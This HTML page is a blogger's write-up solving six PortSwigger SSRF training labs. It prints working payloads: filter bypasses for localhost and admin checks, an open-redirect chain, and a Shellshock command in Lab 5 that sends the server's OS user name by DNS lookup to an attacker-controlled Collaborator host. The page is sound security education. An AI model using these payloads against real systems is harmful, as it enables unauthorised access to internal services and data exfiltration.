<!doctype html><html lang=en dir=auto data-theme=dark><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Mastering SSRF | Solving all Portswigger Labs | 0kxwizard</title><meta name=keywords content="SSRF,WebSecurity,Portswigger,Labs"><meta name=description content="Server Side Request Forgery(SSRF) is a vulnerability that allows attackers to send requests on behalf of a server,  During an SSRF, attackers
forge the request signatures of the vulnerable server, allowing them to assume a privileged position on a network, bypass firewall controls, and gain access
to internal services. In this writeup, we will exxplore how to find some basic SSRFs and also how to bypass some SSRF protections.
LAB 1: Basic SSRF against the local server
Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin."><meta name=author content="Appiah Bismark"><link rel=canonical href=https://kwesilarry1.github.io/writeups/ssrf/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://kwesilarry1.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://kwesilarry1.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://kwesilarry1.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://kwesilarry1.github.io/apple-touch-icon.png><link rel=mask-icon href=https://kwesilarry1.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://kwesilarry1.github.io/writeups/ssrf/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script>localStorage.getItem("pref-theme")==="light"&&(document.querySelector("html").dataset.theme="light")</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-2SDDH3Z7G2"></script><script>var dnt,doNotTrack=!1;if(!0&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-2SDDH3Z7G2")}</script><meta property="og:url" content="https://kwesilarry1.github.io/writeups/ssrf/"><meta property="og:site_name" content="0kxwizard"><meta property="og:title" content="Mastering SSRF | Solving all Portswigger Labs"><meta property="og:description" content="Server Side Request Forgery(SSRF) is a vulnerability that allows attackers to send requests on behalf of a server, During an SSRF, attackers forge the request signatures of the vulnerable server, allowing them to assume a privileged position on a network, bypass firewall controls, and gain access to internal services. In this writeup, we will exxplore how to find some basic SSRFs and also how to bypass some SSRF protections.
LAB 1: Basic SSRF against the local server Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-11-02T13:28:13+00:00"><meta property="article:modified_time" content="2025-11-02T13:28:13+00:00"><meta property="article:tag" content="SSRF"><meta property="article:tag" content="Websecurity"><meta property="article:tag" content="Portswigger"><meta property="article:tag" content="Labs"><meta name=twitter:card content="summary"><meta name=twitter:title content="Mastering SSRF | Solving all Portswigger Labs"><meta name=twitter:description content="Server Side Request Forgery(SSRF) is a vulnerability that allows attackers to send requests on behalf of a server,  During an SSRF, attackers
forge the request signatures of the vulnerable server, allowing them to assume a privileged position on a network, bypass firewall controls, and gain access
to internal services. In this writeup, we will exxplore how to find some basic SSRFs and also how to bypass some SSRF protections.
LAB 1: Basic SSRF against the local server
Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://kwesilarry1.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"Mastering SSRF | Solving all Portswigger Labs","item":"https://kwesilarry1.github.io/writeups/ssrf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Mastering SSRF | Solving all Portswigger Labs","name":"Mastering SSRF | Solving all Portswigger Labs","description":"Server Side Request Forgery(SSRF) is a vulnerability that allows attackers to send requests on behalf of a server, During an SSRF, attackers forge the request signatures of the vulnerable server, allowing them to assume a privileged position on a network, bypass firewall controls, and gain access to internal services. In this writeup, we will exxplore how to find some basic SSRFs and also how to bypass some SSRF protections.\nLAB 1: Basic SSRF against the local server Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin.\n","keywords":["SSRF","WebSecurity","Portswigger","Labs"],"articleBody":"Server Side Request Forgery(SSRF) is a vulnerability that allows attackers to send requests on behalf of a server, During an SSRF, attackers forge the request signatures of the vulnerable server, allowing them to assume a privileged position on a network, bypass firewall controls, and gain access to internal services. In this writeup, we will exxplore how to find some basic SSRFs and also how to bypass some SSRF protections.\nLAB 1: Basic SSRF against the local server Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin.\nClick on ‚Äúview details‚Äù under any of the products to check the stock and capture the request with your proxy tool. We can see that the application uses the ‚ÄústockApi‚Äù parameter to the fetch the product and the stock from an external source,we can then try to change the url to the ‚Äúhttp://localhost/admin‚Äù to see if the application will fetch us the admin interface. After getting the admin interface, we can then go on to delete the user ‚ÄúCarlos‚Äù by uisng the URL provided in the response to solve the lab.\nLAB 2: Blind SSRF with out-of-Outbound Detection Objective: This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.\nWith Blind SSRFs, you cannot read internal files or access internal services directly, so you can make the target send requests to an external server you control then monitor your server logs for requests from the target.You can then use it to scan the internal network for open ports, discover services and map out the network.\nAgain, Click on ‚ÄúView Details‚Äù on any of the products to load the product page then capture the request with our proxy tool. We can go ahead and insert our burp collaborator payload in the ‚Äúreferrer header‚Äù and send the request,Then go to the collaborator tab to see if the target will make any contact with our server. Noticed the target sent HTTP request to our server? The lab should be solved now.\nNB: If you don‚Äôt have burpsuite pro to use the collaborator, you can use an online hosting service that provides server access logs or better still turn your PC into a listener by using Netcat.\nLab 3: SSRF with Blacklit-based input Filter Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.\nNow it‚Äôs time to bypass some protections, Let‚Äôs get started :)\nAs usual Click on ‚ÄúView Details‚Äù on any products and check the stock,the requests must be captured with our proxy tool(I will be using Burpsuite for this).Noticed the application uses ‚ÄúStockApi‚Äù parameter to fetch the stocks again? let‚Äôs change the URL to the localhost admin interface and solve the lab.Oh, Hold‚Äôup! we are been blocked from accessing the admin interface.I tried different encoding techniques(Octal, Hexadecimal, URL, double encoding, dword etc.)but no success, then i started thinking ‚ÄúIs the application blocking me from accessing the localhost or the admin interface or both? , Why don‚Äôt i find a way to access the localhost first?‚Äù I also tried using (localhost, 127.0.0.1, ::1, fc00:: etc.) but no succes then it got to me why don‚Äôt i use ‚Äú127.0.1‚Äù and BOOM! it worked. Now let‚Äôs go add the admin interface to it. Blocked again? By using http://localhost/admiN i was able to bypass the protection and access the admin interface. We can now go on to delete the user and solve the lab, That was a good experience though.\nLab 4: SSRF with filter bypass via open redirection vulnerability Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.\nBy this time you should be familiar with ‚ÄúClick on Details and check stock‚Äù lol, Let‚Äôs move straight to our proxy tool and start playing with the captured request.The ‚ÄúStcokAPi‚Äù parameter again? but this this time it has been restricted to access only the local applicattion so we need to find an open redirect vulnerability in the appliaction first. Go back to the stock check page and noticed that there is a button called ‚ÄúNext Product‚Äù that redirects to the next product using a parameter ‚Äúpath‚Äù. Changing the the url in the path parameter to an arbitrary URl get redirected to that URL proving the existence of an Open Redirect Vulnerability. We can now replace the ‚ÄúStockApi‚Äù parameter with the Open redirect URl and point the path to http://192.168.0.12:8080/admin but don‚Äôt forget to URL-encode it. We can now go ahead and delete the user to solve the lab.\nLab 5: Blind SSRF with Shellshock exploitation Objective: This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.\nWith our normal routine, click on ‚Äúview details‚Äù on any of the products but this time no stock check, let‚Äôs go to our proxy tool and see how best we can play with the request but wait Shellshock Exploitation ? This should be my second time hearing this but i actually don‚Äôt know the commands, so a simple google search revealed that we can use () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net in the User Agent header to exploit it.Now replace the referrer header with http://192.168.0.x:8080 ,highlight the ‚Äòx‚Äô and send the request to intruder so that we can bruteforce and the find the actual IP since we were given a range. The payload settings for the intruder should be like this: Click on Start Attack, After the attack is done, Go to the collaborator tab and notice that the target has sent a DNS request containing the name of the user to our server.Copy the name and submit as solution to solve the lab.\nLAB 6: SSRF with whitelist-based input filter Objective: This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.The developer has deployed an anti-SSRF defense you will need to bypass.\nAnother protection to bypass :) Click on ‚Äúview details‚Äù on any of the products,check the stock and capture the request with our proxy tool. The application uses the ‚ÄúStockApi‚Äù to fetch the product again but changing the URL to an internal server doesn‚Äôt work and gives us an error:Based on the error we know that the host must be stock.weliketoshop.net so we need find a way to trick the server and bypass the protection.After several try and error, i finally came with a bypass thus http://localhost%2523@stock.weliketoshop.net/admin/, The ‚Äò%2523‚Äô is double URL-encoding of ‚Äò#‚Äô We can now go ahead and delete the user to solve the lab. Resources https://portswigger.net/web-security/ssrf https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery https://hackerone.com/reports/243277 https://hackerone.com/reports/223203 https://hackerone.com/reports/530974 https://hackerone.com/reports/793704 https://hackerone.com/reports/746024 https://hackerone.com/reports/549882 ","wordCount":"1276","inLanguage":"en","datePublished":"2025-11-02T13:28:13Z","dateModified":"2025-11-02T13:28:13Z","author":{"@type":"Person","name":"Appiah Bismark"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kwesilarry1.github.io/writeups/ssrf/"},"publisher":{"@type":"Organization","name":"0kxwizard","logo":{"@type":"ImageObject","url":"https://kwesilarry1.github.io/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://kwesilarry1.github.io/ accesskey=h title="0kxwizard (Alt + H)">0kxwizard</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://kwesilarry1.github.io/ title=üè†Home><span>üè†Home</span></a></li><li><a href=https://kwesilarry1.github.io/writeups/ title=üìùWrite-ups><span>üìùWrite-ups</span></a></li><li><a href=https://kwesilarry1.github.io/tags/ title=üè∑Ô∏èTags><span>üè∑Ô∏èTags</span></a></li><li><a href=https://kwesilarry1.github.io/projects/ title=‚öíÔ∏èProjects><span>‚öíÔ∏èProjects</span></a></li><li><a href=https://kwesilarry1.github.io/search/ title="üîçSearch (Alt + /)" accesskey=/><span>üîçSearch</span></a></li><li><a href=https://kwesilarry1.github.io/about/ title=üë§Whoami><span>üë§Whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://kwesilarry1.github.io/>Home</a>&nbsp;¬ª&nbsp;<a href=https://kwesilarry1.github.io/writeups/>Writeups</a></div><h1 class="post-title entry-hint-parent">Mastering SSRF | Solving all Portswigger Labs</h1><div class=post-meta><span title='2025-11-02 13:28:13 +0000 UTC'>November 2, 2025</span>&nbsp;¬∑&nbsp;<span>6 min</span>&nbsp;¬∑&nbsp;<span>Appiah Bismark</span></div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#lab-1-basic-ssrf-against-the-local-server aria-label="LAB 1: Basic SSRF against the local server">LAB 1: Basic SSRF against the local server</a></li><li><a href=#lab-2-blind-ssrf-with-out-of-outbound-detection aria-label="LAB 2: Blind SSRF with out-of-Outbound Detection">LAB 2: Blind SSRF with out-of-Outbound Detection</a></li><li><a href=#lab-3-ssrf-with-blacklit-based-input-filter aria-label="Lab 3: SSRF with Blacklit-based input Filter">Lab 3: SSRF with Blacklit-based input Filter</a></li><li><a href=#lab-4-ssrf-with-filter-bypass-via-open-redirection-vulnerability aria-label="Lab 4: SSRF with filter bypass via open redirection vulnerability">Lab 4: SSRF with filter bypass via open redirection vulnerability</a></li><li><a href=#lab-5-blind-ssrf-with-shellshock-exploitation aria-label="Lab 5: Blind SSRF with Shellshock exploitation">Lab 5: Blind SSRF with Shellshock exploitation</a></li><li><a href=#lab-6-ssrf-with-whitelist-based-input-filter aria-label="LAB 6: SSRF with whitelist-based input filter">LAB 6: SSRF with whitelist-based input filter</a><ul><li><a href=#resources aria-label=Resources>Resources</a></li></ul></li></ul></div></details></div><div class=post-content><p>Server Side Request Forgery(SSRF) is a vulnerability that allows attackers to send requests on behalf of a server, During an SSRF, attackers
forge the request signatures of the vulnerable server, allowing them to assume a privileged position on a network, bypass firewall controls, and gain access
to internal services. In this writeup, we will exxplore how to find some basic SSRFs and also how to bypass some SSRF protections.</p><h3 id=lab-1-basic-ssrf-against-the-local-server>LAB 1: Basic SSRF against the local server<a hidden class=anchor aria-hidden=true href=#lab-1-basic-ssrf-against-the-local-server>#</a></h3><p><em><strong>Objective:</strong></em> This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin.</p><p>Click on &ldquo;view details&rdquo; under any of the products to check the stock and capture the request with your proxy tool.<img alt="Checking Stock" loading=lazy src=/images/Check_stock.png> We can see that the application uses the &ldquo;stockApi&rdquo; parameter to the fetch the product and the stock from an external source,we can then try to change the url to the &ldquo;http://localhost/admin&rdquo; to see if the application will fetch us the admin interface.<img alt="Stocks in burp" loading=lazy src=/images/stock.png><img alt="Admin Panel" loading=lazy src=/images/admin_panel.png>
After getting the admin interface, we can then go on to delete the user &ldquo;Carlos&rdquo; by uisng the URL provided in the response to solve the lab.<img alt=Deleted_User loading=lazy src=/images/deleted_user.png><img alt=Solved_Lab loading=lazy src=/images/Lab_solved.png></p><h3 id=lab-2-blind-ssrf-with-out-of-outbound-detection>LAB 2: Blind SSRF with out-of-Outbound Detection<a hidden class=anchor aria-hidden=true href=#lab-2-blind-ssrf-with-out-of-outbound-detection>#</a></h3><p><em><strong>Objective:</strong></em> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.</p><p>With Blind SSRFs, you cannot read internal files or access internal services directly, so you can make the target send requests to an external server you control then monitor your server logs for requests from the target.You can then use it to scan the internal network for open ports, discover services and map out the network.</p><p>Again, Click on &ldquo;View Details&rdquo; on any of the products to load the product page then capture the request with our proxy tool.<img alt="Product Page" loading=lazy src=/images/Product_page.png> We can go ahead and insert our burp collaborator payload in the &ldquo;referrer header&rdquo; and send the request,Then go to the collaborator tab to see if the target will make any contact with our server.<img alt="collaborator payload" loading=lazy src=/images/burp_collab.png><img alt="Collab Tab" loading=lazy src=/images/collab_tab.png> Noticed the target sent HTTP request to our server? The lab should be solved now.<img alt="Lab2 solved" loading=lazy src=/images/lab2_solved.png></p><p><em><strong>NB:</strong></em> If you don&rsquo;t have burpsuite pro to use the collaborator, you can use an online hosting service that provides server access logs or better still turn your PC into a listener by using Netcat.</p><h3 id=lab-3-ssrf-with-blacklit-based-input-filter>Lab 3: SSRF with Blacklit-based input Filter<a hidden class=anchor aria-hidden=true href=#lab-3-ssrf-with-blacklit-based-input-filter>#</a></h3><p><em><strong>Objective:</strong></em> This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.</p><p>Now it&rsquo;s time to bypass some protections, Let&rsquo;s get started :)</p><p>As usual Click on &ldquo;View Details&rdquo; on any products and check the stock,the requests must be captured with our proxy tool(I will be using Burpsuite for this).Noticed the application uses &ldquo;StockApi&rdquo; parameter to fetch the stocks again? let&rsquo;s change the URL to the localhost admin interface and solve the lab.<img alt="Checking stock" loading=lazy src=/images/LAB3_1.png><img alt="Blocked by app" loading=lazy src=/images/LAB3_2.png>Oh, Hold&rsquo;up! we are been blocked from accessing the admin interface.I tried different encoding techniques(Octal, Hexadecimal, URL, double encoding, dword etc.)but no success, then i started thinking &ldquo;Is the application blocking me from accessing the localhost or the admin interface or both? , Why don&rsquo;t i find a way to access the localhost first?&rdquo; I also tried using (localhost, 127.0.0.1, ::1, fc00:: etc.) but no succes then it got to me why don&rsquo;t i use &ldquo;127.0.1&rdquo; and BOOM! it worked.<img alt="protection bypassed" loading=lazy src=/images/Lab3_3.png> Now let&rsquo;s go add the admin interface to it.<img alt="admin interface blocked" loading=lazy src=/images/lab3_4.png> Blocked again?<img alt="Problems meme" loading=lazy src=/images/MEMES/problems-meme.jpg>
By using <code>http://localhost/admiN</code> i was able to bypass the protection and access the admin interface.<img alt="bypassed protection" loading=lazy src=/images/Lab3_5.png> We can now go on to delete the user and solve the lab, That was a good experience though.<img alt="Deleted User" loading=lazy src=/images/LAB3_6.png><img alt="Lab solved" loading=lazy src=/images/Lab3_6.png></p><h3 id=lab-4-ssrf-with-filter-bypass-via-open-redirection-vulnerability>Lab 4: SSRF with filter bypass via open redirection vulnerability<a hidden class=anchor aria-hidden=true href=#lab-4-ssrf-with-filter-bypass-via-open-redirection-vulnerability>#</a></h3><p><em><strong>Objective:</strong></em> This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos. The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.</p><p>By this time you should be familiar with &ldquo;Click on Details and check stock&rdquo; lol, Let&rsquo;s move straight to our proxy tool and start playing with the captured request.The &ldquo;StcokAPi&rdquo; parameter again? but this this time it has been restricted to access only the local applicattion so we need to find an open redirect vulnerability in the appliaction first.<img alt="Stock Check Request" loading=lazy src=/images/Lab4.1.png>
Go back to the stock check page and noticed that there is a button called &ldquo;Next Product&rdquo; that redirects to the next product using a parameter &ldquo;path&rdquo;.<img alt="Redirection vuln" loading=lazy src=/images/Lab4.2.png> Changing the the url in the path parameter to an arbitrary URl get redirected to that URL proving the existence of an Open Redirect Vulnerability.<img alt="Open Redirect" loading=lazy src=/images/Lab4.3.png> We can now replace the &ldquo;StockApi&rdquo; parameter with the Open redirect URl and point the path to <code>http://192.168.0.12:8080/admin</code> but don&rsquo;t forget to URL-encode it. <img alt="Admin interface" loading=lazy src=/images/Lab4.5.png> <img alt="User Deletd" loading=lazy src=/images/Lab4.7.png>We can now go ahead and delete the user to solve the lab.<img alt="Lab solved" loading=lazy src=/images/lab4.8.png></p><h3 id=lab-5-blind-ssrf-with-shellshock-exploitation>Lab 5: Blind SSRF with Shellshock exploitation<a hidden class=anchor aria-hidden=true href=#lab-5-blind-ssrf-with-shellshock-exploitation>#</a></h3><p><em><strong>Objective:</strong></em> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded. To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.</p><p>With our normal routine, click on &ldquo;view details&rdquo; on any of the products but this time no stock check, let&rsquo;s go to our proxy tool and see how best we can play with the request but wait <em><strong>Shellshock Exploitation ?</strong></em> This should be my second time hearing this but i actually don&rsquo;t know the commands, so a simple google search revealed that we can use <code>() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net</code> in the User Agent header to exploit it.Now replace the referrer header with <code>http://192.168.0.x:8080</code> ,highlight the &lsquo;x&rsquo; and send the request to intruder so that we can bruteforce and the find the actual IP since we were given a range.<img alt="fuzz meme" loading=lazy src=/images/MEMES/fuzz-meme.jpeg> The payload settings for the intruder should be like this:<img alt="payload settings" loading=lazy src=/images/Lab4.8.png> Click on Start Attack, After the attack is done, Go to the collaborator tab and notice that the target has sent a DNS request containing the name of the user to our server.Copy the name and submit as solution to solve the lab.<img alt="Attack completed" loading=lazy src=/images/Lab4.9.png><img alt="DNS Request" loading=lazy src=/images/Lab4.10.png><img alt="Solved Lab" loading=lazy src=/images/Lab4.11.png></p><h3 id=lab-6-ssrf-with-whitelist-based-input-filter>LAB 6: SSRF with whitelist-based input filter<a hidden class=anchor aria-hidden=true href=#lab-6-ssrf-with-whitelist-based-input-filter>#</a></h3><p><em><strong>Objective:</strong></em> This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.The developer has deployed an anti-SSRF defense you will need to bypass.</p><p>Another protection to bypass :)
Click on &ldquo;view details&rdquo; on any of the products,check the stock and capture the request with our proxy tool.
The application uses the &ldquo;StockApi&rdquo; to fetch the product again but changing the URL to an internal server doesn&rsquo;t work and gives us an error:<img alt=Error loading=lazy src=/images/lab4.12.png>Based on the error we know that the host must be <code>stock.weliketoshop.net</code> so we need find a way to trick the server and bypass the protection.After several try and error, i finally came with a bypass thus <code>http://localhost%2523@stock.weliketoshop.net/admin/</code>, The &lsquo;%2523&rsquo; is double URL-encoding of &lsquo;#&rsquo; <img alt=Bypass loading=lazy src=/images/Lab4.12.png> We can now go ahead and delete the user to solve the lab. <img alt="User deleted" loading=lazy src=/images/Lab4.13.png><img alt="Lab solved" loading=lazy src=/images/Lab4.14.png></p><h4 id=resources>Resources<a hidden class=anchor aria-hidden=true href=#resources>#</a></h4><ul><li><a href=https://portswigger.net/web-security/ssrf>https://portswigger.net/web-security/ssrf</a></li><li><a href=https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet>https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet</a></li><li><a href=https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html>https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</a></li><li><a href=https://hackerone.com/reports/243277>https://hackerone.com/reports/243277</a></li><li><a href=https://hackerone.com/reports/223203>https://hackerone.com/reports/223203</a></li><li><a href=https://hackerone.com/reports/530974>https://hackerone.com/reports/530974</a></li><li><a href=https://hackerone.com/reports/793704>https://hackerone.com/reports/793704</a></li><li><a href=https://hackerone.com/reports/746024>https://hackerone.com/reports/746024</a></li><li><a href=https://hackerone.com/reports/549882>https://hackerone.com/reports/549882</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://kwesilarry1.github.io/tags/ssrf/>SSRF</a></li><li><a href=https://kwesilarry1.github.io/tags/websecurity/>Websecurity</a></li><li><a href=https://kwesilarry1.github.io/tags/portswigger/>Portswigger</a></li><li><a href=https://kwesilarry1.github.io/tags/labs/>Labs</a></li></ul><nav class=paginav><a class=prev href=https://kwesilarry1.github.io/writeups/2025-year-review/><span class=title>¬´ Prev</span><br><span>2025 Year Review</span>
</a><a class=next href=https://kwesilarry1.github.io/writeups/vulnerable_bank/><span class=title>Next ¬ª</span><br><span>How I Hacked A Vulnerable Bank Application</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://kwesilarry1.github.io/>0kxwizard</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>